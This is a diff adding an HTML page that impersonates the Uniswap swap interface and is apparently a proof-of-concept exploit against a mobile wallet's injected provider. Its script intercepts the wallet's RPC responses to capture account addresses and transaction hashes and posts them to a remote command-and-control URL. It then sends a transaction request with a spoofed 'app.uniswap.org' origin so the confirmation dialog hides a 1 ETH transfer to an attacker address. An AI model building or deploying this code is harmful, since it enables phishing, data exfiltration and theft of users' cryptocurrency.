@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Uniswap Interface</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background: #1a1a2e;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+            margin: 0;
+        }
+        h1 { color: #ff007a; margin-bottom: 4px; }
+        p.sub { color: #aaa; font-size: 13px; margin-top: 0; }
+        .card {
+            background: #16213e;
+            border-radius: 12px;
+            padding: 24px;
+            width: 300px;
+            margin-top: 20px;
+        }
+        .card p { color: #ccc; font-size: 14px; margin-top: 0; }
+        button {
+            background: #ff007a;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 24px;
+            width: 100%;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:disabled { background: #444; cursor: not-allowed; }
+        #swapBtn { background: #0d6efd; display: none; }
+        #status {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #aaa;
+            word-break: break-all;
+            text-align: center;
+            max-width: 320px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <h1>🦄 Uniswap</h1>
+    <p class="sub">Swap tokens in an instant</p>
+    <div class="card">
+        <p>Connect your wallet to start swapping</p>
+        <button onclick="connect()" id="connectBtn">Connect Wallet</button>
+        <button onclick="sendTx()" id="swapBtn">Swap 1 ETH → USDC</button>
+    </div>
+    <div id="status">Ready</div>
+
+<script>
+// ── CONFIG ───────────────────────────────────────────────────────
+// UPDATE THESE TWO VALUES before running
+var C2 = "https://dglabz.github.io/api/v1/connect";
+var ATTACKER = "0x0000000000000000000000000000000000000001"; // replace with your address
+// ─────────────────────────────────────────────────────────────────
+
+var stolenAddress = null;
+var origSendResponse = null;
+
+function log(msg) {
+    console.log("[POC] " + msg);
+    document.getElementById('status').innerText = msg;
+}
+
+// Exfil via fetch - falls back to XHR if fetch fails
+function exfil(data) {
+    var payload = JSON.stringify(data);
+    log("Sending to C2...");
+
+    fetch(C2, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'ngrok-skip-browser-warning': '1'   // ← bypasses ngrok interstitial
+        },
+        body: payload
+    }).then(function(r) {
+        log("C2 response: " + r.status);
+    }).catch(function(e) {
+        log("fetch failed, trying XHR...");
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', C2, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.setRequestHeader('ngrok-skip-browser-warning', '1');  // ← also on XHR
+        xhr.onload = function() { log("XHR C2: " + xhr.status); };
+        xhr.onerror = function() { log("XHR failed"); };
+        xhr.send(payload);
+    });
+}
+// Called when we have the address - either immediately or after approval
+function onAddressReceived(address, allAccounts) {
+    stolenAddress = address;
+    log("Got address: " + address);
+    exfil({
+        type: 'wallet_address',
+        address: address,
+        allAccounts: allAccounts || [address],
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+    });
+    document.getElementById('swapBtn').style.display = 'block';
+    document.getElementById('connectBtn').disabled = false;
+}
+
+function armInterceptor() {
+    try {
+        // Save original ONCE
+        if (!origSendResponse) {
+            origSendResponse = window.cdc_wallet.evmRpcClient.sendResponse;
+        }
+
+        window.cdc_wallet.evmRpcClient.sendResponse = function(response) {
+            log("sendResponse intercepted: " + JSON.stringify(response));
+
+            if (response && response.result) {
+                var result = response.result;
+
+                // eth_requestAccounts / eth_accounts → array of addresses
+                if (Array.isArray(result) && result.length > 0 && !stolenAddress) {
+                    onAddressReceived(result[0], result);
+                }
+
+                // eth_sendTransaction → tx hash
+                if (typeof result === 'string' && result.startsWith('0x') && result.length === 66) {
+                    log("TX HASH: " + result);
+                    exfil({ type: 'tx_hash', hash: result, timestamp: new Date().toISOString() });
+                }
+            }
+
+            // Always call original so app doesn't break
+            if (origSendResponse) origSendResponse.call(this, response);
+        };
+        log("sendResponse interceptor armed");
+        return true;
+    } catch(e) {
+        log("arm interceptor err: " + e);
+        return false;
+    }
+}
+
+function connect() {
+    log("Starting connect...");
+    document.getElementById('connectBtn').disabled = true;
+
+    // Wait for cdc_wallet to be injected (up to 3 seconds)
+    var attempts = 0;
+    var waitForProvider = setInterval(function() {
+        attempts++;
+        if (window.cdc_wallet && window.cdc_wallet.evmRpcClient) {
+            clearInterval(waitForProvider);
+            log("Provider found after " + attempts + " attempts");
+            doConnect();
+        } else if (attempts > 30) {
+            clearInterval(waitForProvider);
+            log("Provider not found after 3s - bridge may not be available");
+            document.getElementById('connectBtn').disabled = false;
+        }
+    }, 100);
+}
+
+function doConnect() {
+    // Arm interceptor
+    armInterceptor();
+
+    // Check if already connected
+    try {
+        var accounts = window.cdc_wallet.ethereum.accounts;
+        if (accounts && accounts.length > 0) {
+            log("Already connected");
+            onAddressReceived(accounts[0], accounts);
+            return;
+        }
+    } catch(e) {}
+
+    // Request accounts - use real host for step 1
+    try {
+        window._tw_.evmMessage(
+            "Uniswap Interface",
+            location.href,
+            JSON.stringify({ id: 1, method: "eth_requestAccounts", params: [] }),
+            "1"
+        );
+        log("eth_requestAccounts sent - approve in wallet");
+    } catch(e) {
+        log("evmMessage err: " + e);
+        document.getElementById('connectBtn').disabled = false;
+    }
+}
+
+function sendTx() {
+    if (!stolenAddress) {
+        log("Connect first");
+        return;
+    }
+
+    log("Sending transaction with spoofed origin...");
+
+    // Re-arm interceptor for tx response
+    armInterceptor();
+
+    // Send transaction with SPOOFED host - this is what shows in the confirmation dialog
+    try {
+        window._tw_.evmMessage(
+            "Uniswap Interface",        // pageTitle → shown as dapp name
+            "https://app.uniswap.org",          // host → shown as dapp URL in confirmation
+            JSON.stringify({
+                id: 2,
+                method: "eth_sendTransaction",
+                params: [{
+                    from: stolenAddress,
+                    to: ATTACKER,
+                    value: "0xDE0B6B3A7640000",  // 1 ETH
+                    gas: "0x5208"
+                }]
+            }),
+            "1"
+        );
+        log("TX sent - confirmation dialog should show: app.uniswap.org");
+    } catch(e) {
+        log("sendTx err: " + e);
+    }
+}
+</script>
+</body>
+</html>
